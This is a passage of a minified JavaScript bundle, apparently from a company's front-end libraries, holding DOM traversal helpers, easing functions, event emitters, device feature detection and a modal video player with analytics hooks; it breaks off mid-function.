i=e("@marcom/ac-dom-nodes/isNode"),r=e("@marcom/ac-dom-nodes/COMMENT_NODE"),o=e("@marcom/ac-dom-nodes/DOCUMENT_FRAGMENT_NODE"),s=e("@marcom/ac-dom-nodes/DOCUMENT_NODE"),a=e("@marcom/ac-dom-nodes/ELEMENT_NODE"),c=e("@marcom/ac-dom-nodes/TEXT_NODE"),l=function(e,t){return!!i(e)&&("number"==typeof t?e.nodeType===t:-1!==t.indexOf(e.nodeType))},u=[a,s,o],h=[a,c,r];t.exports={parentNode:function(e,t,n,i){if(i=i||"node",(e||t)&&!l(e,u))throw new TypeError(n+": "+i+" must be an Element, Document, or Document Fragment")},childNode:function(e,t,n,i){if(i=i||"node",(e||t)&&!l(e,h))throw new TypeError(n+": "+i+" must be an Element, TextNode, or Comment")},selector:function(e,t,n,i){if(i=i||"selector",(e||t)&&"string"!=typeof e)throw new TypeError(n+": "+i+" must be a string")}}},{"@marcom/ac-dom-nodes/COMMENT_NODE":87,"@marcom/ac-dom-nodes/DOCUMENT_FRAGMENT_NODE":88,"@marcom/ac-dom-nodes/DOCUMENT_NODE":89,"@marcom/ac-dom-nodes/ELEMENT_NODE":90,"@marcom/ac-dom-nodes/TEXT_NODE":91,"@marcom/ac-dom-nodes/isNode":97,"@marcom/ac-polyfills/Array/prototype.indexOf":198}],107:[function(e,t,n){"use strict";var i=e("./children"),r=e("./internal/validate");t.exports=function(e,t){var n;return r.parentNode(e,!0,"lastChild"),r.selector(t,!1,"lastChild"),e.lastElementChild&&!t?e.lastElementChild:(n=i(e,t)).length?n[n.length-1]:null}},{"./children":102,"./internal/validate":106}],108:[function(e,t,n){"use strict";var i=e("@marcom/ac-dom-nodes/isElement"),r=e("./internal/validate"),o=e("./internal/nativeMatches"),s=e("./shims/matchesSelector");t.exports=function(e,t){return r.selector(t,!0,"matchesSelector"),!!i(e)&&(o?o.call(e,t):s(e,t))}},{"./internal/nativeMatches":105,"./internal/validate":106,"./shims/matchesSelector":115,"@marcom/ac-dom-nodes/isElement":96}],109:[function(e,t,n){"use strict";var i=e("@marcom/ac-dom-nodes/isElement"),r=e("./matchesSelector"),o=e("./internal/validate");t.exports=function(e,t){if(o.childNode(e,!0,"nextSibling"),o.selector(t,!1,"nextSibling"),e.nextElementSibling&&!t)return e.nextElementSibling;for(;e=e.nextSibling;)if(i(e)&&(!t||r(e,t)))return e;return null}},{"./internal/validate":106,"./matchesSelector":108,"@marcom/ac-dom-nodes/isElement":96}],110:[function(e,t,n){"use strict";var i=e("@marcom/ac-dom-nodes/isElement"),r=e("./matchesSelector"),o=e("./internal/validate");t.exports=function(e,t){var n=[];for(o.childNode(e,!0,"nextSiblings"),o.selector(t,!1,"nextSiblings");e=e.nextSibling;)i(e)&&(t&&!r(e,t)||n.push(e));return n}},{"./internal/validate":106,"./matchesSelector":108,"@marcom/ac-dom-nodes/isElement":96}],111:[function(e,t,n){"use strict";var i=e("@marcom/ac-dom-nodes/isElement"),r=e("./matchesSelector"),o=e("./internal/validate");t.exports=function(e,t){if(o.childNode(e,!0,"previousSibling"),o.selector(t,!1,"previousSibling"),e.previousElementSibling&&!t)return e.previousElementSibling;for(;e=e.previousSibling;)if(i(e)&&(!t||r(e,t)))return e;return null}},{"./internal/validate":106,"./matchesSelector":108,"@marcom/ac-dom-nodes/isElement":96}],112:[function(e,t,n){"use strict";var i=e("@marcom/ac-dom-nodes/isElement"),r=e("./matchesSelector"),o=e("./internal/validate");t.exports=function(e,t){var n=[];for(o.childNode(e,!0,"previousSiblings"),o.selector(t,!1,"previousSiblings");e=e.previousSibling;)i(e)&&(t&&!r(e,t)||n.push(e));return n.reverse()}},{"./internal/validate":106,"./matchesSelector":108,"@marcom/ac-dom-nodes/isElement":96}],113:[function(e,t,n){"use strict";var i=e("./internal/validate"),r=e("./shims/querySelector"),o="querySelector"in document;t.exports=function(e,t){return t=t||document,i.parentNode(t,!0,"querySelector","context"),i.selector(e,!0,"querySelector"),o?t.querySelector(e):r(e,t)}},{"./internal/validate":106,"./shims/querySelector":116}],114:[function(e,t,n){"use strict";e("@marcom/ac-polyfills/Array/prototype.slice");var i=e("./internal/validate"),r=e("./shims/querySelectorAll"),o="querySelectorAll"in document;t.exports=function(e,t){return t=t||document,i.parentNode(t,!0,"querySelectorAll","context"),i.selector(e,!0,"querySelectorAll"),o?Array.prototype.slice.call(t.querySelectorAll(e)):r(e,t)}},{"./internal/validate":106,"./shims/querySelectorAll":117,"@marcom/ac-polyfills/Array/prototype.slice":203}],115:[function(e,t,n){"use strict";var i=e("../querySelectorAll");t.exports=function(e,t){var n,r=e.parentNode||document,o=i(t,r);for(n=0;n<o.length;n++)if(o[n]===e)return!0;return!1}},{"../querySelectorAll":114}],116:[function(e,t,n){"use strict";var i=e("./querySelectorAll");t.exports=function(e,t){var n=i(e,t);return n.length?n[0]:null}},{"./querySelectorAll":117}],117:[function(e,t,n){"use strict";e("@marcom/ac-polyfills/Array/prototype.indexOf");var i=e("@marcom/ac-dom-nodes/isElement"),r=e("@marcom/ac-dom-nodes/isDocumentFragment"),o=e("@marcom/ac-dom-nodes/remove"),s=function(e,t){var n;if(t===document)return!0;for(n=e;(n=n.parentNode)&&i(n);)if(n===t)return!0;return!1},a=function(e){"recalc"in e?e.recalc(!1):document.recalc(!1),window.scrollBy(0,0)};t.exports=function(e,t){var n,i=document.createElement(),c="_ac_qsa_"+(Math.random()+"").slice(-6),l=[];for(t=t||document,document[c]=[],i.innerHTML="x<style>*{display:recalc;}"+e+'{ac-qsa:expression(document["'+c+'"] && document["'+c+'"].push(this));}',i=i.lastChild,r(t)?t.appendChild(i):document.documentElement.firstChild.appendChild(i),a(t);document[c].length;)(n=document[c].shift()).style.removeAttribute("ac-qsa"),-1===l.indexOf(n)&&s(n,t)&&l.push(n);return document[c]=null,o(i),a(t),l}},{"@marcom/ac-dom-nodes/isDocumentFragment":95,"@marcom/ac-dom-nodes/isElement":96,"@marcom/ac-dom-nodes/remove":98,"@marcom/ac-polyfills/Array/prototype.indexOf":198}],118:[function(e,t,n){"use strict";var i=e("./children"),r=e("./internal/validate");t.exports=function(e,t){var n=[];return r.childNode(e,!0,"siblings"),r.selector(t,!1,"siblings"),e.parentNode&&(n=(n=i(e.parentNode,t)).filter((function(t){return t!==e}))),n}},{"./children":102,"./internal/validate":106}],119:[function(e,t,n){"use strict";function i(e,t){if("function"!=typeof e)throw new TypeError("Ease expects an easing function.");this.easingFunction=e,this.cssString=t||null}i.prototype.getValue=function(e){return this.easingFunction(e,0,1,1)},t.exports=i},{}],120:[function(e,t,n){"use strict";e("@marcom/ac-polyfills/Array/prototype.every");var i=e("./Ease"),r=e("./helpers/KeySpline"),o="Bezier curve expects exactly four (4) numbers. Given: ";t.exports=function(e,t,n,s){var a=Array.prototype.slice.call(arguments),c=a.every((function(e){return"number"==typeof e}));if(4!==a.length||!c)throw new TypeError(o+a);var l=new r(e,t,n,s),u=function(e,t,n,i){return l.get(e/i)*n+t},h="cubic-bezier("+a.join(", ")+")";return new i(u,h)}},{"./Ease":119,"./helpers/KeySpline":121,"@marcom/ac-polyfills/Array/prototype.every":195}],121:[function(e,t,n){t.exports=function(e,t,n,i){function r(e,t){return 1-3*t+3*e}function o(e,t){return 3*t-6*e}function s(e){return 3*e}function a(e,t,n){return((r(t,n)*e+o(t,n))*e+s(t))*e}function c(e,t,n){return 3*r(t,n)*e*e+2*o(t,n)*e+s(t)}this.get=function(r){return e===t&&n===i?r:a(function(t){for(var i=t,r=0;r<4;++r){var o=c(i,e,n);if(0===o)return i;i-=(a(i,e,n)-t)/o}return i}(r),t,i)}}},{}],122:[function(e,t,n){"use strict";t.exports={EventEmitterMicro:e("./ac-event-emitter-micro/EventEmitterMicro")}},{"./ac-event-emitter-micro/EventEmitterMicro":123}],123:[function(e,t,n){"use strict";function i(){this._events={}}var r=i.prototype;r.on=function(e,t){this._events[e]=this._events[e]||[],this._events[e].unshift(t)},r.once=function(e,t){var n=this;this.on(e,(function i(r){n.off(e,i),void 0!==r?t(r):t()}))},r.off=function(e,t){if(this.has(e)){if(1===arguments.length)return this._events[e]=null,void delete this._events[e];var n=this._events[e].indexOf(t);-1!==n&&this._events[e].splice(n,1)}},r.trigger=function(e,t){if(this.has(e))for(var n=this._events[e].length-1;n>=0;n--)void 0!==t?this._events[e][n](t):this._events[e][n]()},r.has=function(e){return e in this._events!=0&&0!==this._events[e].length},r.destroy=function(){for(var e in this._events)this._events[e]=null;this._events=null},t.exports=i},{}],124:[function(e,t,n){t.exports.EventEmitter=e("./ac-event-emitter/EventEmitter")},{"./ac-event-emitter/EventEmitter":125}],125:[function(e,t,n){"use strict";var i="EventEmitter:propagation",r=function(e){e&&(this.context=e)},o=r.prototype,s=function(){return this.hasOwnProperty("_events")||"object"==typeof this._events||(this._events={}),this._events},a=function(e,t){var n=e[0],i=e[1],r=e[2];if("string"!=typeof n&&"object"!=typeof n||null===n||Array.isArray(n))throw new TypeError("Expecting event name to be a string or object.");if("string"==typeof n&&!i)throw new Error("Expecting a callback function to be provided.");if(i&&"function"!=typeof i){if("object"!=typeof n||"object"!=typeof i)throw new TypeError("Expecting callback to be a function.");r=i}if("object"==typeof n)for(var o in n)t.call(this,o,n[o],r);"string"==typeof n&&(n=n.split(" ")).forEach((function(e){t.call(this,e,i,r)}),this)},c=function(e,t){var n,i,r;if((n=s.call(this)[e])&&0!==n.length)for(n=n.slice(),this._stoppedImmediatePropagation=!1,i=0,r=n.length;i<r&&!this._stoppedImmediatePropagation&&!t(n[i],i);i++);},l=function(e,t,n){var i=-1;c.call(this,t,(function(e,t){if(e.callback===n)return i=t,!0})),-1!==i&&e[t].splice(i,1)};o.on=function(){var e=s.call(this);return a.call(this,arguments,(function(t,n,i){e[t]=e[t]||(e[t]=[]),e[t].push({callback:n,context:i})})),this},o.once=function(){return a.call(this,arguments,(function(e,t,n){var i=function(r){t.call(n||this,r),this.off(e,i)};this.on(e,i,this)})),this},o.off=function(e,t){var n=s.call(this);if(0===arguments.length)this._events={};else if(!e||"string"!=typeof e&&"object"!=typeof e||Array.isArray(e))throw new TypeError("Expecting event name to be a string or object.");if("object"==typeof e)for(var i in e)l.call(this,n,i,e[i]);if("string"==typeof e){var r=e.split(" ");1===r.length?t?l.call(this,n,e,t):n[e]=[]:r.forEach((function(e){n[e]=[]}))}return this},o.trigger=function(e,t,n){if(!e)throw new Error("trigger method requires an event name");if("string"!=typeof e)throw new TypeError("Expecting event names to be a string.");if(n&&"boolean"!=typeof n)throw new TypeError("Expecting doNotPropagate to be a boolean.");return(e=e.split(" ")).forEach((function(e){c.call(this,e,function(e){e.callback.call(e.context||this.context||this,t)}.bind(this)),n||c.call(this,i,(function(n){var i=e;n.prefix&&(i=n.prefix+i),n.emitter.trigger(i,t)}))}),this),this},o.propagateTo=function(e,t){var n=s.call(this);n[i]||(this._events[i]=[]),n[i].push({emitter:e,prefix:t})},o.stopPropagatingTo=function(e){var t=s.call(this);if(e){var n,r=t[i],o=r.length;for(n=0;n<o;n++)if(r[n].emitter===e){r.splice(n,1);break}}else t[i]=[]},o.stopImmediatePropagation=function(){this._stoppedImmediatePropagation=!0},o.has=function(e,t,n){var i=s.call(this),r=i[e];if(0===arguments.length)return Object.keys(i);if(!r)return!1;if(!t)return r.length>0;for(var o=0,a=r.length;o<a;o++){var c=r[o];if(n&&t&&c.context===n&&c.callback===t)return!0;if(t&&!n&&c.callback===t)return!0}return!1},t.exports=r},{}],126:[function(e,t,n){"use strict";t.exports={getWindow:function(){return window},getDocument:function(){return document},getNavigator:function(){return navigator}}},{}],127:[function(e,t,n){"use strict";var i=e("@marcom/useragent-detect").os,r=e("./touchAvailable").original,o=e("./helpers/globals"),s=e("@marcom/ac-function/once");function a(){var e=o.getWindow();return!r()&&!e.orientation||i.windows}t.exports=s(a),t.exports.original=a},{"./helpers/globals":126,"./touchAvailable":131,"@marcom/ac-function/once":155,"@marcom/useragent-detect":435}],128:[function(e,t,n){"use strict";var i=e("./isDesktop").original,r=e("./isTablet").original,o=e("@marcom/ac-function/once");function s(){return!i()&&!r()}t.exports=o(s),t.exports.original=s},{"./isDesktop":127,"./isTablet":130,"@marcom/ac-function/once":155}],129:[function(e,t,n){"use strict";var i=e("./helpers/globals");t.exports=function(){var e=i.getWindow();return"devicePixelRatio"in e&&e.devicePixelRatio>=1.5}},{"./helpers/globals":126}],130:[function(e,t,n){"use strict";var i=e("./isDesktop").original,r=e("./helpers/globals"),o=e("@marcom/ac-function/once");function s(){var e=r.getWindow(),t=e.screen.width;return e.orientation&&e.screen.height<t&&(t=e.screen.height),!i()&&t>=600}t.exports=o(s),t.exports.original=s},{"./helpers/globals":126,"./isDesktop":127,"@marcom/ac-function/once":155}],131:[function(e,t,n){"use strict";var i=e("./helpers/globals"),r=e("@marcom/ac-function/once");function o(){var e=i.getWindow(),t=i.getDocument(),n=i.getNavigator();return!!("ontouchstart"in e||e.DocumentTouch&&t instanceof e.DocumentTouch||n.maxTouchPoints>0||n.msMaxTouchPoints>0)}t.exports=r(o),t.exports.original=o},{"./helpers/globals":126,"@marcom/ac-function/once":155}],132:[function(e,t,n){"use strict";var i=e("./helpers/globals"),r=e("@marcom/ac-function/once");function o(){var e=i.getDocument().createElement("canvas");return"function"==typeof e.getContext&&!(!e.getContext("webgl")&&!e.getContext("experimental-webgl"))}t.exports=r(o),t.exports.original=o},{"./helpers/globals":126,"@marcom/ac-function/once":155}],133:[function(e,t,n){t.exports={major:6,minor:7,patch:1,prerelease:null,toString:function(){return"6.7.1 (e05a9a5)"},toArray:function(){return[6,7,1]}}},{}],134:[function(e,t,n){"use strict";var i;t.exports={create:function(){return i||(i=e("./factory/createFilms")),i.apply(this,arguments)}}},{"./factory/createFilms":139}],135:[function(e,t,n){"use strict";var i;try{i=e("@marcom/ac-analytics")}catch(e){}var r=e("@marcom/useragent-detect").browser,o=r.ie||r.edge,s=e("@marcom/ac-video/event-emitter-shim/EventEmitterShim"),a=function(e,t,n){if(n){var i=function(){t.apply(n,arguments)};s.prototype.once.apply(this,[e,i])}else s.prototype.once.apply(this,arguments)};function c(e,t,n){this.player=e,this.sources={},this.currentStubPlayer=null,this.playerType="",this.videoType="",this.options=t,n&&this._bindAnchors(n)}var l=c.prototype;l._bindAnchors=function(e){for(var t=0,n=e.length;t<n;t++)this._bindAnchorForAnalytics(e[t])},l.activate=function(){this._onPlay=this._onPlay.bind(this),this._onEnded=this._onEnded.bind(this),this._onTimeupdate=this._onTimeupdate.bind(this),this._onTexttrackshow=this._onTexttrackshow.bind(this),this._onLoadStart=this._onLoadStart.bind(this),this.setCurrentStubPlayer=this.setCurrentStubPlayer.bind(this),this._onPlayPromiseResolved=this._onPlayPromiseResolved.bind(this),o?this.player.on("playing",this._onPlay):this.player.on("play",this._onPlay),this.player.on("ended",this._onEnded),this.player.on("loadstart",this._onLoadStart),this.player.on("timeupdate",this._onTimeupdate),this.player.on("texttrackshow",this._onTexttrackshow),this.player.on("PlayPromiseResolved",this._onPlayPromiseResolved),this.player.on("durationchange",this.setCurrentStubPlayer)},l.deactivate=function(){o?this.player.off("playing",this._onPlay):this.player.off("play",this._onPlay),this.player.off("ended",this._onEnded),this.player.off("timeupdate",this._onTimeupdate),this.player.off("texttrackshow",this._onTexttrackshow),this.player.off("durationchange",this.setCurrentStubPlayer),this.player.off("PlayPromiseResolved",this._onPlayPromiseResolved)},l._bindAnchorForAnalytics=function(e){var t;if(e){if(this.sources[e.id])return;t=this._createStubPlayer(e),e.getAttribute("data-"+this.options.dataAttribute)||(t.videoId=e.id),this.sources[e.id]={stubPlayer:t,observer:this._createObserver(t)}}},l.addSourceObject=l._bindAnchorForAnalytics,l.setCurrentStubPlayer=function(){var e,t=this.player.el.getAttribute("data-"+this.options.dataAttribute),n=this._getCurrentSourceObject(t);n&&n.stubPlayer&&(this.currentStubPlayer=n.stubPlayer,this.playerType="html5",(e=this.player.getCurrentSrc())&&(this.videoType=e.split(".").pop()))},l.destroy=function(){this.deactivate(),this.player=null,this.sources=null,this.currentStubPlayer=null,this.options=null},l._onPlay=function(){this.setCurrentStubPlayer(),this._started||(this._proxyEvent("play"),this._started=!0)},l._onPlayPromiseResolved=function(){this.setCurrentStubPlayer(),this._proxyEvent("PlayPromiseResolved")},l._onLoadStart=function(){this._started=!1},l._onEnded=function(){this._started=!1,this._proxyEvent("ended")},l._onTimeupdate=function(){this._proxyEvent("timeupdate"),this._started&&0===this.player.getCurrentTime()&&this.player.getPaused()&&(this._started=!1)},l._onTexttrackshow=function(){this._proxyEvent("captions-enabled")},l._getSourceObjectBySrcObjId=function(e){return this.sources[e]||null},l._getCurrentSourceObject=function(e){var t;return e&&(t=this._getSourceObjectBySrcObjId(e)),t},l._createStubPlayer=function(e){var t=new s;return t.once=a,t.el=e,t.VERSION=this.player.VERSION,t},l._getEventData=function(){return{currentTime:this.player.getCurrentTime(),playerType:this.playerType||"html5",videoType:this.videoType||null}},l._createObserver=function(e){var t;return i&&i.observer&&i.observer.Video&&(t=new i.observer.Video(e,{dataAttribute:this.options.dataAttribute})),t},l._proxyEvent=function(e){this.currentStubPlayer&&this.currentStubPlayer.trigger(e,this._getEventData())},t.exports=c},{"@marcom/ac-analytics":void 0,"@marcom/ac-video/event-emitter-shim/EventEmitterShim":310,"@marcom/useragent-detect":435}],136:[function(e,t,n){"use strict";var i=e("../windowload/windowLoad"),r=e("@marcom/useragent-detect"),o=e("@marcom/feature-detect/touchAvailable")(),s=r.os.ios||r.os.android||r.os.osx&&o;t.exports=function(e,t,n,r){const o={click:function(n){n.preventDefault(),t(e)},TriggerAnchor:function(){t(e)}};return Object.keys(o).forEach((t=>{e.addEventListener(t,o[t])})),r&&e.id&&r.createRoute(e.id,(function(){i((function(){t(e,!s)}))})),{detatch:function(){Object.keys(o).forEach((t=>{e.removeEventListener(t,o[t])}))}}}},{"../windowload/windowLoad":145,"@marcom/feature-detect/touchAvailable":430,"@marcom/useragent-detect":435}],137:[function(e,t,n){"use strict";var i=e("@marcom/ac-router").Router,r=e("@marcom/ac-video/player/factory/createShareablePlayer"),o=e("@marcom/ac-video/optimizeVideoUrl"),s=e("@marcom/useragent-detect"),a=e("./bindAnchor"),c=e("./createClickHandler"),l=e("./createModalLink"),u=e("./createHandheldModalLink"),h=e("./createInlineLink"),d="data-films-options",p=e("@marcom/feature-detect/isHandheld")(),f=s.os.ios,m={controls:!0,urlOptimizer:o};t.exports=function(e,t){t=t||{},t=Object.assign({},m,t);let n=!1;var o;e.forEach((function(e){e.hasAttribute(d)&&(!1!==JSON.parse(e.getAttribute(d)).closeOnEnd||t.closeOnEnd||(t.closeOnEnd=!1)),-1!==e.href.indexOf(".m3u8")&&(n=!0)})),t.maxWidth||(t.maxWidth=1280),t.hls=void 0!==t.hls?t.hls:n;var s,_=r(t);o=new i({hashChange:!0,pushState:!1});var v=(s=!t.modal||p&&f&&!t.threesixty?t.modal?u(_,document.body,t):h(_,t):l(_,t)).play.bind(s),g=c({player:_,playHandler:v,attr:"data-"+t.dataAttribute});const y=new Map;e.forEach((function(e){y.set(e,a(e,g,v,o))}));const b=function(e,t){e.detatch(),y.delete(t)};return o.start(),{play:function(t){for(var n=0,i=e.length;n<i;n++)e[n].id!==t&&e[n]!==t||v(e[n].href)},player:_,modalVideo:s.modal,destroy:function(){y.forEach(b),s.destroy()}}}},{"./bindAnchor":136,"./createClickHandler":138,"./createHandheldModalLink":140,"./createInlineLink":141,"./createModalLink":142,"@marcom/ac-router":255,"@marcom/ac-video/optimizeVideoUrl":311,"@marcom/ac-video/player/factory/createShareablePlayer":317,"@marcom/feature-detect/isHandheld":427,"@marcom/useragent-detect":435}],138:[function(e,t,n){"use strict";const i=e("@marcom/feature-detect/isRetina");t.exports=function(e){return function(t,n){let r=null;Array.from(document.querySelectorAll(".theme-dark")).find((function(t){return t.contains(e.player.el)}))&&(r=i()?"/ac/ac-video-posterframe/4.0/images/ac_video_poster_dark_960x540_2x.jpg":"/ac/ac-video-posterframe/4.0/images/ac_video_poster_dark_960x540.jpg");const o=t.getAttribute("data-films-options");let s;s=o?JSON.parse(o):null,s&&s.endState&&s.endState.items.forEach((function(e){if(e.url&&0===e.url.indexOf("#")){const t=document.querySelector(e.url);e.onclick=function(){t.dispatchEvent(new CustomEvent("TriggerAnchor"))}}})),s||(s={}),s.poster||(s.poster=r);var a=t.getAttribute("data-films-modal-label")||s&&s.modalLabel||e.player.options.modalLabel||"Video Player";e.player.el.setAttribute(e.attr,t.getAttribute(e.attr)||t.id),e.playHandler(t.href,s,n,a)}}},{"@marcom/feature-detect/isRetina":428}],139:[function(e,t,n){"use strict";const i=e("./bindAnchors"),r=e("../analytics/AnalyticsTranslator"),o={dataAttribute:"analytics-video-id",analytics:!0};e("@marcom/ac-console/log")(`@marcom/ac-films version: ${e("../../../.versionfile").toString()}`),t.exports=function(e,t){t=t||{},t=Object.assign({},o,t);const n=i(e,t);return t.analytics&&new r(n.player,t,e).activate(),n}},{"../../../.versionfile":133,"../analytics/AnalyticsTranslator":135,"./bindAnchors":137,"@marcom/ac-console/log":69}],140:[function(e,t,n){"use strict";const i="player-fullscreen";t.exports=function(e,t,n){return e.el.classList.add("ac-films-handheld-player"),t.appendChild(e.el),{play:function(n,r,o){const s=function(){e.isPictureInPicture()||(e.getPaused()||e.pause(),e.el.classList.remove(i))};e.el.classList.add(i),e.once("ended",s),e.once("exitfullscreen",s);const a=t.getAttribute("data-films-options");a&&(r=Object.assign({},r,JSON.parse(a))),e.load(n,null,0,Object.assign({maxWidth:window.innerWidth},r)),!1!==o&&e.play()},player:e,destroy:function(){e.destroy()}}}},{}],141:[function(e,t,n){"use strict";t.exports=function(e,t){var n=t.targetElement,i=function(t,n){e.load(t,null,0,n),e.play()};return t.playHandler=i,n&&n.appendChild(e.el),{play:i,player:e,destroy:function(){e.destroy()}}}},{}],142:[function(e,t,n){"use strict";var i=e("@marcom/ac-modal").createFullViewportModal,r=e("@marcom/useragent-detect"),o=e("@marcom/feature-detect/touchAvailable")(),s=r.os.ios||r.os.android||r.os.osx&&o,a=e("./link/ModalLink");t.exports=function(e,t){t=t||{};var n=document.createElement("div");n.classList.add("ac-player-container"),s&&n.classList.add("ac-films-modal-mobile"),n.appendChild(e.el);var r=i(n);return r.modalElement.classList.add("ac-modal-video"),new a({player:e,modal:r,closeOnEnd:t.closeOnEnd})}},{"./link/ModalLink":143,"@marcom/ac-modal":179,"@marcom/feature-detect/touchAvailable":430,"@marcom/useragent-detect":435}],143:[function(e,t,n){"use strict";var i=/_([0-9]+)x([0-9]+)/,r="ac-video-cinematic-aspect-ratio",o="ac-video-square-aspect-ratio",s="ac-video-vertical-aspect-ratio",a="ac-video-19x9-aspect-ratio",c="ac-video-9x19-aspect-ratio",l="ac-modal-video-pip",u="pictureinpicture:change",h=e("../../resize/ResizeHandler"),d=e("@marcom/ac-video/utils/urlOptimizer/19X9AssetSizes"),p=function(e){this.modal=e.modal,this.player=e.player,this._resizeHandler=new h({player:this.player,modal:this.modal}),this._closeOnEnd=void 0===e.closeOnEnd||e.closeOnEnd,this._ended=!1,this._pauseTime=0,this._playing=!1,this._initialize()},f=p.prototype;f._initialize=function(){this._bindMethods(),this.player.on("ended",this._onEnded),this.player.on("pause",this._onPaused),this.modal.on("open",this._onOpen),this.player.supportsPictureInPicture()&&this.player.on(u,this._onPipModeChanged)},f._bindMethods=function(){this._onEnded=this._onEnded.bind(this),this._onPipModeChanged=this._onPipModeChanged.bind(this),this._onPaused=this._onPaused.bind(this),this._onModalWillClose=this._onModalWillClose.bind(this),this._onOpen=this._onOpen.bind(this)},f._onOpen=function(){this.player.refreshSize()},f._onPaused=function(){this._pauseTime=Date.now()},f._onEnded=function(){this._ended=!0,!this.player.isPictureInPicture()&&this._closeOnEnd?this.modal.close():this.player.isPictureInPicture()&&(this.player.setPictureInPicture(!1),this.modal.modalElement.classList.remove(l),this._closeOnEnd||(this.modal.open(),this._bindWillClose()))},f._onPipModeChanged=function(){this._ended||(this.player.isPictureInPicture()&&this._isModalOpen()?(this._unBindWillClose(),this.modal.modalElement.classList.add(l),this.modal.close()):this._isModalOpen()||(this.modal.modalElement.classList.remove(l),!this._pauseTime||Date.now()-this._pauseTime>400?(this._bindWillClose(),this.modal.open()):this._resetVideo()))},f._resetVideo=function(){this.player.pause(),this.player.setCurrentTime(0)},f._onModalWillClose=function(){this._unBindWillClose(),this._resetVideo(),this.player.setPictureInPicture(!1),this.modal.modalElement.classList.remove(l)},f._clearAspectRatio=function(){this.player.el.parentElement.classList.remove(r),this.player.el.parentElement.classList.remove(o),this.player.el.parentElement.classList.remove(s),this.player.el.parentElement.classList.remove(a),this.player.el.parentElement.classList.remove(c)},f._set19X9Mode=function(){this.player.el.parentElement.classList.add(a)},f._set9X19Mode=function(){this.player.el.parentElement.classList.add(c)},f._setCinematicMode=function(){this.player.el.parentElement.classList.add(r)},f._setSquareVideo=function(){this.player.el.parentElement.classList.add(o)},f._setVerticalVideo=function(){this.player.el.parentElement.classList.add(s)},f._resetPiPVideo=function(){var e=this.player.getVisibleTextTracks();e.forEach((function(e){e.mode="hidden"})),this._resetVideo(),e.forEach((function(e){e.mode="showing"}))},f.play=function(e,t,n,r){if(this._ended=!1,this._clearAspectRatio(),e.match("-tft-"))this._setCinematicMode();else if(i.test(e)){var o=parseInt(RegExp.$1,10),s=parseInt(RegExp.$2,10);a={width:o,height:s},d.find((function(e){return e.width===a.width&&(e.height=a.height)||e.width===a.height&&(e.height=a.width)}))?s>o?this._set9X19Mode(!0):this._set19X9Mode(!0):s>o?this._setVerticalVideo(!0):s===o&&this._setSquareVideo(!0)}var a;this.modal.modalElement.setAttribute("aria-label",r),this.player.load(e,null,0,Object.assign({},t,{maxWidth:window.innerWidth})),this.player.isPictureInPicture()?this._resetPiPVideo():(this.modal.open(),this._bindWillClose()),!1!==n&&this.player.play()},f._bindWillClose=function(){this.modal.on("willclose",this._onModalWillClose)},f._unBindWillClose=function(){this.modal.off("willclose",this._onModalWillClose)},f._isModalOpen=function(){return document.documentElement.classList.contains("has-modal")},f.destroy=function(){this.player.off("ended",this._onEnded),this.player.off("paused",this._onPaused),this.player.off(u,this._onPipModeChanged),this._unBindWillClose(),this._resizeHandler.destroy(),this.modal.destroy(),this.player.destroy()},t.exports=p},{"../../resize/ResizeHandler":144,"@marcom/ac-video/utils/urlOptimizer/19X9AssetSizes":396}],144:[function(e,t,n){"use strict";var i=/_([0-9]+)x([0-9]+)/,r=e("@marcom/useragent-detect"),o=e("@marcom/feature-detect/touchAvailable")(),s=r.os.ios||r.os.android||r.os.osx&&o;function a(e){this._modal=e.modal,this._player=e.player,this._mediaElement=e.player.getMediaElement(),this._posterEl=this._player.el.querySelector(".ac-video-poster img"),this._playerContainer=this._player.el.parentElement,this._bindMethods(),this._addEventListeners(),this._calcAspectRatio()}var c=a.prototype;c._bindMethods=function(){this._onLoadStart=this._onLoadStart.bind(this),this._onResize=this._onResize.bind(this),this._fullScreenChange=this._fullScreenChange.bind(this),this._calcAspectRatio=this._calcAspectRatio.bind(this),this._addResizeListeners=this._addResizeListeners.bind(this),this._removeResizeListeners=this._removeResizeListeners.bind(this),this._onModalOpen=this._onModalOpen.bind(this)},c._addEventListeners=function(){this._posterEl&&this._posterEl.addEventListener("load",this._calcAspectRatio),this._modal.on("willopen",this._addResizeListeners),this._modal.on("open",this._onModalOpen),this._modal.on("close",this._removeResizeListeners)},c._onModalOpen=function(){this._loadStarted&&(this._onResize(),this._player.el.style.display="",this._player.el.style.opacity="")},c._addResizeListeners=function(){this._mediaElement=this._player.getMediaElement(),this._player.el.style.display="block",this._player.el.style.opacity=0,window.addEventListener("resize",this._onResize),window.addEventListener("orientationchange",this._onResize),this._player.on("loadstart",this._onLoadStart),this._player.on("loadeddata",this._calcAspectRatio),this._player.on("fullscreen:change",this._fullScreenChange),this._player.on("fullscreen:willenter",this._fullScreenChange),this._calcAspectRatio()},c._removeResizeListeners=function(){this._onResize(),window.removeEventListener("resize",this._onResize),window.removeEventListener("orientationchange",this._onResize),this._player.off("loadstart",this._onLoadStart),this._player.off("loadeddata",this._calcAspectRatio),this._player.off("fullscreen:change",this._fullScreenChange)},c._removeEventListeners=function(){this._removeResizeListeners(),this._modal.off("willopen",this._addResizeListeners),this._modal.off("open",this._onModalOpen),this._modal.off("close",this._removeResizeListeners),this._posterEl&&this._posterEl.removeEventListener("load",this._calcAspectRatio)},c._onLoadStart=function(){this._mediaElement=this._player.getMediaElement(),this._loadStarted=!1,requestAnimationFrame(function(){this._loadStarted=!0,this._onModalOpen()}.bind(this)),this._calcAspectRatio()},c._calcAspectRatio=function(){this._aspectRatio=this._player.getMediaWidth()/this._player.getMediaHeight(),(isNaN(this._aspectRatio)||this._aspectRatio<=0)&&this._player.getCurrentSrc()&&i.test(this._player.getCurrentSrc())&&(this._aspectRatio=parseInt(RegExp.$1,10)/parseInt(RegExp.$2,10)),(isNaN(this._aspectRatio)||this._aspectRatio<=0)&&this._posterEl&&(this._aspectRatio=this._posterEl.naturalWidth/this._posterEl.naturalHeight),this._onResize()},c._fullScreenChange=function(e){if(e&&"enter"===e.type)return clearTimeout(this._fullScreenChangeTimeout),void(this._fullScreenChangeTimeout=setTimeout(function(){this._isFullScreen=!0,this._onResize()}.bind(this),60));this._isFullScreen=this._player.isFullscreen(),this._onResize()},c.destroy=function(){clearTimeout(this._fullScreenChangeTimeout),this._removeEventListeners()},c._onResize=function(){var e=this._aspectRatio;if(isNaN(e))return this._mediaElement.style.width="",void(this._mediaElement.style.height="");var t=window.innerWidth,n=window.innerHeight,i=t/n;if(this._mediaElement.readyState<1){var 